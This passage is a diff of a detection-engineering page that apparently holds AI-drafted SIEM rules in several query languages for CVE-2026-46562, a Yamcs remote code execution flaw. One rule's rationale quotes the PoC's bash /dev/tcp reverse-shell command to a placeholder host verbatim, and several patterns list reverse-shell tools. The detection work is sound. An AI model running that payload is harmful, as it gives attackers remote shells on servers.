-| ImageFileName=/(bash|sh|dash|zsh|ksh|cmd\.exe|powershell\.exe|pwsh(\.exe)?)$/i
-| RevShellHint := if(regex(&quot;/dev/tcp/|bash -i|sh -i|exec 3&lt;&gt;|mkfifo|nc -e|ncat -e&quot;, field=CommandLine, strict=false), then=&quot;likely-reverse-shell&quot;, else=&quot;&quot;)
-| groupBy([aid, ComputerName, ParentBaseFileName, ImageFileName, CommandLine, RevShellHint], function=count())</code></pre></div>
-    <div class="tab-content" id="art-01-uc1-spl"><span class="splunk-cat-pill splunk-cat-endpoint" title="Splunk-research detection category">ENDPOINT</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-01-uc1-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-01-uc1-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-01-uc1-spl-acc"><button class="copy-btn">COPY</button><code>| tstats summariesonly=true count min(_time) as firstTime max(_time) as lastTime values(Processes.process) as cmdline values(Processes.process_id) as child_pid values(Processes.parent_process) as parent_cmd values(Processes.user) as user from datamodel=Endpoint.Processes where (Processes.parent_process_name=&quot;java&quot; OR Processes.parent_process_name=&quot;java.exe&quot;) (Processes.parent_process=&quot;*yamcs*&quot; OR Processes.parent_process=&quot;*org.yamcs*&quot;) (Processes.process_name IN (&quot;bash&quot;,&quot;sh&quot;,&quot;dash&quot;,&quot;zsh&quot;,&quot;ksh&quot;,&quot;cmd.exe&quot;,&quot;powershell.exe&quot;,&quot;pwsh&quot;,&quot;pwsh.exe&quot;)) by Processes.dest Processes.parent_process_name Processes.process_name | `drop_dm_object_name(Processes)` | convert ctime(firstTime) ctime(lastTime)</code></pre><pre class="spl-mode-body" id="art-01-uc1-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime values(Processes.process) as cmdline values(Processes.process_id) as child_pid values(Processes.parent_process) as parent_cmd values(Processes.user) as user from datamodel=Endpoint.Processes where (Processes.parent_process_name=&quot;java&quot; OR Processes.parent_process_name=&quot;java.exe&quot;) (Processes.parent_process=&quot;*yamcs*&quot; OR Processes.parent_process=&quot;*org.yamcs*&quot;) (Processes.process_name IN (&quot;bash&quot;,&quot;sh&quot;,&quot;dash&quot;,&quot;zsh&quot;,&quot;ksh&quot;,&quot;cmd.exe&quot;,&quot;powershell.exe&quot;,&quot;pwsh&quot;,&quot;pwsh.exe&quot;)) by Processes.dest Processes.parent_process_name Processes.process_name | `drop_dm_object_name(Processes)` | convert ctime(firstTime) ctime(lastTime)</code></pre></div></div>
+    <div class="tab-content" id="art-01-uc1-datadog"><pre><button class="copy-btn">COPY</button><code>source:(linux.auditd OR windows.sysmon) (@process.parent.name:java OR @ParentImage:(*\/java OR */java.exe)) (@process.parent.command_line:(*yamcs* OR *org.yamcs*) OR @ParentCommandLine:(*yamcs* OR *org.yamcs*)) (@process.name:(sh OR bash OR dash OR zsh OR nc OR ncat OR socat OR python OR python3 OR perl) OR @Image:(*\/sh OR *\/bash OR *\/dash OR *\/nc OR *\/ncat OR *\/socat))</code></pre></div>
+    <div class="tab-content" id="art-01-uc1-falcon"><pre><button class="copy-btn">COPY</button><code>#event_simpleName=ProcessRollup2 ParentBaseFileName=/^java$/i | regex(&quot;yamcs|org\\.yamcs&quot;, field=ParentCommandLine) | ImageFileName=/\/(sh|bash|dash|zsh|nc|ncat|socat|python3?|perl|ruby)$/i | groupBy([aid, ComputerName, UserName, ImageFileName, CommandLine, ParentCommandLine], function=count())</code></pre></div>
+    <div class="tab-content" id="art-01-uc1-spl"><span class="splunk-cat-pill splunk-cat-endpoint" title="Splunk-research detection category">ENDPOINT</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-01-uc1-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-01-uc1-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-01-uc1-spl-acc"><button class="copy-btn">COPY</button><code>| tstats summariesonly=true count min(_time) as firstTime max(_time) as lastTime values(Processes.process) as cmd values(Processes.parent_process) as parent_cmd from datamodel=Endpoint.Processes where Processes.parent_process_name=&quot;java&quot; Processes.process_name IN (&quot;sh&quot;,&quot;bash&quot;,&quot;dash&quot;,&quot;zsh&quot;,&quot;nc&quot;,&quot;ncat&quot;,&quot;socat&quot;,&quot;python&quot;,&quot;python3&quot;,&quot;perl&quot;) (Processes.parent_process=&quot;*yamcs*&quot; OR Processes.parent_process=&quot;*yamcs-core*&quot; OR Processes.parent_process=&quot;*org.yamcs*&quot;) by host Processes.user Processes.parent_process_name Processes.process_name | `drop_dm_object_name(Processes)` | convert ctime(firstTime) ctime(lastTime)</code></pre><pre class="spl-mode-body" id="art-01-uc1-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime values(Processes.process) as cmd values(Processes.parent_process) as parent_cmd from datamodel=Endpoint.Processes where Processes.parent_process_name=&quot;java&quot; Processes.process_name IN (&quot;sh&quot;,&quot;bash&quot;,&quot;dash&quot;,&quot;zsh&quot;,&quot;nc&quot;,&quot;ncat&quot;,&quot;socat&quot;,&quot;python&quot;,&quot;python3&quot;,&quot;perl&quot;) (Processes.parent_process=&quot;*yamcs*&quot; OR Processes.parent_process=&quot;*yamcs-core*&quot; OR Processes.parent_process=&quot;*org.yamcs*&quot;) by host Processes.user Processes.parent_process_name Processes.process_name | `drop_dm_object_name(Processes)` | convert ctime(firstTime) ctime(lastTime)</code></pre></div></div>
   </div>
 </details>
-<details class="uc" data-uc-slug="df4187284e" data-platforms="datadog,def,falcon,sent,spl" data-targets="linux,windows">
+<details class="uc" data-uc-slug="19eedc23cf" data-platforms="datadog,def,falcon,sent,sigma,spl" data-targets="linux,vcs,windows">
   <summary>
-    <span class="uc-title">[LLM] Yamcs JVM initiating outbound TCP to non-mission-control destination (post-RCE C2)</span>
+    <span class="uc-title">[LLM] Reverse-shell /dev/tcp file descriptor from Yamcs java process tree</span>
     <span class="uc-phase">Command &amp; Control</span>
-    <span class="uc-conf medium">Medium</span>
-    <button class="share-btn" data-share-uc="df4187284e" title="Copy share link to this UC" aria-label="Copy share link">
+    <span class="uc-conf high">High</span>
+    <button class="share-btn" data-share-uc="19eedc23cf" title="Copy share link to this UC" aria-label="Copy share link">
       <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
     </button>
   </summary>
   <div class="uc-body">
-    <div class="uc-desc">Detects the network-layer artefact of CVE-2026-46562: the Yamcs Java process initiating an outbound TCP connection to an internet IP on a non-standard port — the shape a `/dev/tcp/{LHOST}/{LPORT}` reverse-shell takes after the Nashorn breakout. Catches the attack even when shell-spawn telemetry is missing (e.g. the attacker pivots to in-JVM Java exec instead of `bash -c`).
+    <div class="uc-desc">Detects the bash `exec 3&lt;&gt;/dev/tcp/HOST/PORT` reverse-shell file-descriptor primitive when it descends from the Yamcs JVM. This is the *exact* payload string in the CVE-2026-46562 PoC and catches the post-exploitation network pivot whether or not UC2 caught the initial spawn.
 
-Rationale: Pivots on the JVM-as-source-process plus internet destination plus non-mission-port — the exact shape a `/dev/tcp/{LHOST}/{LPORT}` reverse shell takes when issued from `Runtime.exec`. Excludes the well-known Yamcs egress ports (HTTP 80, HTTPS 443, the Yamcs HTTP API 8090) and RFC1918 to suppress legitimate intra-data-center traffic. Sigma left empty because the detection requires the host-scoping join + private-IP exclusion that Sigma can&#x27;t express cleanly.
-
-Cross-checked against:
-  • https://github.com/advisories/GHSA-vmwp-vh32-rj75
-  • https://docs.yamcs.org/yamcs-server-manual/services/global/http-server/</div>
-    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Application Layer Protocol: Web Protocols">T1071.001</span> <span class="ind tech" title="Non-Application Layer Protocol">T1095</span> <span class="ind tech" title="Remote Access Software">T1219</span></div>
-    <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Network_Traffic.All_Traffic</span></div>
+Rationale: Verbatim from the GHSA PoC body: `[&quot;bash&quot;,&quot;-c&quot;,&quot;exec 3&lt;&gt;/dev/tcp/${LHOST}/${LPORT}; id &gt;&amp;3; sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;]`. The `/dev/tcp/` token is unique to bash-builtin reverse shells (no legitimate Yamcs subroutine writes to that pseudo-path), and constraining the parent chain to the Yamcs JVM cuts the broad LFI-style FPs that pure `/dev/tcp/` rules suffer. No external corroboration available (advisory is sole public source).</div>
+    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Command and Scripting Interpreter: Unix Shell">T1059.004</span> <span class="ind tech" title="Application Layer Protocol: Web Protocols">T1071.001</span> <span class="ind tech" title="Remote Access Software">T1219</span></div>
+    <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Endpoint.Processes</span></div>
     <div class="tabs">
       <button class="tab-btn active" data-target="art-01-uc2-kql">Defender KQL</button>
       <button class="tab-btn" data-target="art-01-uc2-sentinel">Sentinel KQL</button>
+      <button class="tab-btn" data-target="art-01-uc2-sigma">Sigma</button>
       <button class="tab-btn" data-target="art-01-uc2-datadog">Datadog</button>
       <button class="tab-btn" data-target="art-01-uc2-falcon">Falcon LogScale</button>
       <button class="tab-btn" data-target="art-01-uc2-spl">Splunk SPL (CIM)</button>
     </div>
-    <div class="tab-content active" id="art-01-uc2-kql"><pre><button class="copy-btn">COPY</button><code>let YamcsHosts = DeviceProcessEvents
-    | where Timestamp &gt; ago(1d)
-    | where FileName in~ (&quot;java&quot;,&quot;java.exe&quot;) and ProcessCommandLine has_any (&quot;yamcs&quot;,&quot;org.yamcs&quot;)
-    | distinct DeviceId, DeviceName;
-DeviceNetworkEvents
+    <div class="tab-content active" id="art-01-uc2-kql"><pre><button class="copy-btn">COPY</button><code>DeviceProcessEvents
 | where Timestamp &gt; ago(7d)
-| where InitiatingProcessFileName in~ (&quot;java&quot;,&quot;java.exe&quot;)
-| where InitiatingProcessCommandLine has_any (&quot;yamcs&quot;,&quot;org.yamcs&quot;)
-| where RemoteIPType == &quot;Public&quot;
-| where ActionType == &quot;ConnectionSuccess&quot;
-| where RemotePort !in (80, 443, 8090)
-| join kind=inner YamcsHosts on DeviceId
-| summarize FirstSeen = min(Timestamp), LastSeen = max(Timestamp), ConnCount = count() by DeviceName, RemoteIP, RemotePort, InitiatingProcessCommandLine
-| where ConnCount &gt; 0
-| order by FirstSeen desc</code></pre></div>
-    <div class="tab-content" id="art-01-uc2-sentinel"><pre><button class="copy-btn">COPY</button><code>let YamcsHosts = ImProcessCreate
-    | where TimeGenerated &gt; ago(1d)
-    | where ActingProcessName in~ (&quot;java&quot;,&quot;java.exe&quot;) and ActingProcessCommandLine has_any (&quot;yamcs&quot;,&quot;org.yamcs&quot;)
-    | distinct DvcHostname;
-ImNetworkSession
+| where ProcessCommandLine has_any (&quot;/dev/tcp/&quot;,&quot;/dev/udp/&quot;)
+| where FileName in~ (&quot;bash&quot;,&quot;sh&quot;,&quot;dash&quot;,&quot;zsh&quot;)
+| where InitiatingProcessFileName =~ &quot;java&quot;
+   or InitiatingProcessCommandLine has_any (&quot;yamcs&quot;,&quot;org.yamcs&quot;,&quot;yamcs-core&quot;)
+   or InitiatingProcessParentFileName =~ &quot;java&quot;
+| extend RevHost = extract(@&quot;/dev/(?:tcp|udp)/([^/\s]+)/\d+&quot;, 1, ProcessCommandLine)
+| extend RevPort = extract(@&quot;/dev/(?:tcp|udp)/[^/\s]+/(\d+)&quot;, 1, ProcessCommandLine)
+| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, RevHost, RevPort,
+          ParentImage = InitiatingProcessFolderPath, ParentCmd = InitiatingProcessCommandLine
+| order by Timestamp desc</code></pre></div>
+    <div class="tab-content" id="art-01-uc2-sentinel"><pre><button class="copy-btn">COPY</button><code>ImProcessCreate
 | where TimeGenerated &gt; ago(7d)
-| where DvcHostname in (YamcsHosts)
-| where NetworkDirection =~ &quot;Outbound&quot;
-| where NetworkProtocol =~ &quot;TCP&quot;
-| where not(ipv4_is_private(DstIpAddr))
-| where DstPortNumber !in (80, 443, 8090)
-| summarize FirstSeen = min(TimeGenerated), LastSeen = max(TimeGenerated), ConnCount = count(), BytesOut = sum(NetworkBytes) by DvcHostname, DstIpAddr, DstPortNumber
-| order by FirstSeen desc</code></pre></div>
-    <div class="tab-content" id="art-01-uc2-datadog"><pre><button class="copy-btn">COPY</button><code>source:linux.auditd @auditd.type:(SOCKADDR OR NETFILTER_CFG) @process.name:java (@process.command_line:*yamcs* OR @process.command_line:*org.yamcs*) -CIDR(@network.destination.ip, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 127.0.0.0/8) -@network.destination.port:(80 OR 443 OR 8090)</code></pre></div>
-    <div class="tab-content" id="art-01-uc2-falcon"><pre><button class="copy-btn">COPY</button><code>#event_simpleName=NetworkConnectIP4
-| ContextImageFileName=/\/java(\.exe)?$/i
-| ConnectionDirection=0
-| Protocol=6
-| !cidr(&quot;10.0.0.0/8&quot;, field=RemoteAddressIP4) AND !cidr(&quot;172.16.0.0/12&quot;, field=RemoteAddressIP4) AND !cidr(&quot;192.168.0.0/16&quot;, field=RemoteAddressIP4) AND !cidr(&quot;127.0.0.0/8&quot;, field=RemoteAddressIP4)
-| RemotePort!=80 RemotePort!=443 RemotePort!=8090
-| join({#event_simpleName=ProcessRollup2 | ImageFileName=/\/java(\.exe)?$/i | regex(&quot;(yamcs|org\.yamcs)&quot;, field=CommandLine, strict=false) | groupBy([aid], function=count())}, field=aid, include=[aid])
-| groupBy([aid, ComputerName, RemoteAddressIP4, RemotePort], function=[count(), min(_time)])</code></pre></div>
-    <div class="tab-content" id="art-01-uc2-spl"><span class="splunk-cat-pill splunk-cat-network" title="Splunk-research detection category">NETWORK</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-01-uc2-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-01-uc2-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-01-uc2-spl-acc"><button class="copy-btn">COPY</button><code>| tstats summariesonly=true count values(All_Traffic.dest_ip) as dest_ips values(All_Traffic.dest_port) as dest_ports values(All_Traffic.bytes_out) as bytes_out values(All_Traffic.app) as app from datamodel=Network_Traffic.All_Traffic where (All_Traffic.process_name=&quot;java&quot; OR All_Traffic.process_name=&quot;java.exe&quot;) All_Traffic.transport=tcp All_Traffic.direction=outbound NOT (All_Traffic.dest_ip IN (&quot;10.0.0.0/8&quot;,&quot;172.16.0.0/12&quot;,&quot;192.168.0.0/16&quot;,&quot;127.0.0.0/8&quot;)) NOT (All_Traffic.dest_port IN (80,443,8090,5672,15672,389,636,53)) by All_Traffic.src All_Traffic.process All_Traffic.dest_ip All_Traffic.dest_port _time | `drop_dm_object_name(All_Traffic)` | where bytes_out &gt; 0</code></pre><pre class="spl-mode-body" id="art-01-uc2-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count values(All_Traffic.dest_ip) as dest_ips values(All_Traffic.dest_port) as dest_ports values(All_Traffic.bytes_out) as bytes_out values(All_Traffic.app) as app from datamodel=Network_Traffic.All_Traffic where (All_Traffic.process_name=&quot;java&quot; OR All_Traffic.process_name=&quot;java.exe&quot;) All_Traffic.transport=tcp All_Traffic.direction=outbound NOT (All_Traffic.dest_ip IN (&quot;10.0.0.0/8&quot;,&quot;172.16.0.0/12&quot;,&quot;192.168.0.0/16&quot;,&quot;127.0.0.0/8&quot;)) NOT (All_Traffic.dest_port IN (80,443,8090,5672,15672,389,636,53)) by All_Traffic.src All_Traffic.process All_Traffic.dest_ip All_Traffic.dest_port _time | `drop_dm_object_name(All_Traffic)` | where bytes_out &gt; 0</code></pre></div></div>
+| where ActingProcessCommandLine has_any (&quot;/dev/tcp/&quot;,&quot;/dev/udp/&quot;) or TargetProcessCommandLine has_any (&quot;/dev/tcp/&quot;,&quot;/dev/udp/&quot;)
+| where (ParentProcessName endswith &quot;/java&quot; or ParentProcessName =~ &quot;java&quot;)
+   or ParentProcessCommandLine has_any (&quot;yamcs&quot;,&quot;org.yamcs&quot;,&quot;yamcs-core&quot;)
+| extend Cmd = coalesce(ActingProcessCommandLine, TargetProcessCommandLine)
+| extend RevHost = extract(@&quot;/dev/(?:tcp|udp)/([^/\s]+)/\d+&quot;, 1, Cmd)
+| extend RevPort = extract(@&quot;/dev/(?:tcp|udp)/[^/\s]+/(\d+)&quot;, 1, Cmd)
+| project TimeGenerated, DvcHostname, ActorUsername, ParentProcessName, ParentProcessCommandLine, Cmd, RevHost, RevPort
+| order by TimeGenerated desc</code></pre></div>
+    <div class="tab-content" id="art-01-uc2-sigma"><pre><button class="copy-btn">COPY</button><code>title: Bash /dev/tcp Reverse Shell Descending From Yamcs JVM (CVE-2026-46562)
+id: 2c7b9e3a-4d5f-46a1-b8c2-8e4d3f7a91d0
+description: bash/sh process executing the /dev/tcp/HOST/PORT reverse-shell file-descriptor primitive with the Yamcs java process anywhere in its parent chain. Exact string from the CVE-2026-46562 PoC.
+references:
+  - https://github.com/advisories/GHSA-vmwp-vh32-rj75
+author: SOC Detection Engineering
+date: 2026/05/28
+tags:
+  - attack.t1059.004
+  - attack.t1071.001
+logsource:
+  category: process_creation
+  product: linux
+detection:
+  selection_shell:
+    Image|endswith:
+      - &#x27;/bash&#x27;
+      - &#x27;/sh&#x27;
+      - &#x27;/dash&#x27;
+      - &#x27;/zsh&#x27;
+  selection_payload:
+    CommandLine|contains:
+      - &#x27;/dev/tcp/&#x27;
+      - &#x27;/dev/udp/&#x27;
+  selection_parent:
+    ParentImage|endswith: &#x27;/java&#x27;
+  selection_parent_cmd:
+    ParentCommandLine|contains:
+      - &#x27;yamcs&#x27;
+      - &#x27;org.yamcs&#x27;
+  condition: selection_shell and selection_payload and (selection_parent or selection_parent_cmd)
+level: critical</code></pre></div>
+    <div class="tab-content" id="art-01-uc2-datadog"><pre><button class="copy-btn">COPY</button><code>(@process.command_line:(*\/dev\/tcp\/* OR *\/dev\/udp\/*) OR @CommandLine:(*\/dev\/tcp\/* OR *\/dev\/udp\/*)) (@process.name:(bash OR sh OR dash OR zsh) OR @Image:(*\/bash OR *\/sh OR *\/dash OR *\/zsh)) (@process.parent.name:java OR @ParentImage:*\/java OR @process.parent.command_line:(*yamcs* OR *org.yamcs*) OR @ParentCommandLine:(*yamcs* OR *org.yamcs*))</code></pre></div>
+    <div class="tab-content" id="art-01-uc2-falcon"><pre><button class="copy-btn">COPY</button><code>#event_simpleName=ProcessRollup2 ImageFileName=/\/(bash|sh|dash|zsh)$/i | regex(&quot;/dev/(tcp|udp)/&quot;, field=CommandLine) ParentBaseFileName=/^java$/i | regex(&quot;yamcs|org\\.yamcs&quot;, field=ParentCommandLine) | rest := regex(&quot;/dev/(?:tcp|udp)/(?&lt;RevHost&gt;[^/\\s]+)/(?&lt;RevPort&gt;\\d+)&quot;, field=CommandLine, strict=false) | groupBy([aid, ComputerName, UserName, CommandLine, RevHost, RevPort], function=count())</code></pre></div>
+    <div class="tab-content" id="art-01-uc2-spl"><span class="splunk-cat-pill splunk-cat-endpoint" title="Splunk-research detection category">ENDPOINT</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-01-uc2-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-01-uc2-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-01-uc2-spl-acc"><button class="copy-btn">COPY</button><code>| tstats summariesonly=true count min(_time) as firstTime max(_time) as lastTime values(Processes.process) as cmd from datamodel=Endpoint.Processes where Processes.process_name IN (&quot;bash&quot;,&quot;sh&quot;,&quot;dash&quot;,&quot;zsh&quot;) (Processes.process=&quot;*/dev/tcp/*&quot; OR Processes.process=&quot;*/dev/udp/*&quot;) (Processes.parent_process_name=&quot;java&quot; OR Processes.parent_process=&quot;*yamcs*&quot; OR Processes.parent_process=&quot;*org.yamcs*&quot;) by host Processes.user Processes.parent_process_name Processes.process | `drop_dm_object_name(Processes)` | rex field=cmd &quot;/dev/tcp/(?&lt;rev_host&gt;[^/\s]+)/(?&lt;rev_port&gt;\d+)&quot; | convert ctime(firstTime) ctime(lastTime)</code></pre><pre class="spl-mode-body" id="art-01-uc2-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime values(Processes.process) as cmd from datamodel=Endpoint.Processes where Processes.process_name IN (&quot;bash&quot;,&quot;sh&quot;,&quot;dash&quot;,&quot;zsh&quot;) (Processes.process=&quot;*/dev/tcp/*&quot; OR Processes.process=&quot;*/dev/udp/*&quot;) (Processes.parent_process_name=&quot;java&quot; OR Processes.parent_process=&quot;*yamcs*&quot; OR Processes.parent_process=&quot;*org.yamcs*&quot;) by host Processes.user Processes.parent_process_name Processes.process | `drop_dm_object_name(Processes)` | rex field=cmd &quot;/dev/tcp/(?&lt;rev_host&gt;[^/\s]+)/(?&lt;rev_port&gt;\d+)&quot; | convert ctime(firstTime) ctime(lastTime)</code></pre></div></div>
   </div>
 </details>
 <details class="uc" data-uc-slug="222a505c20" data-platforms="def,sent,spl" data-targets="">
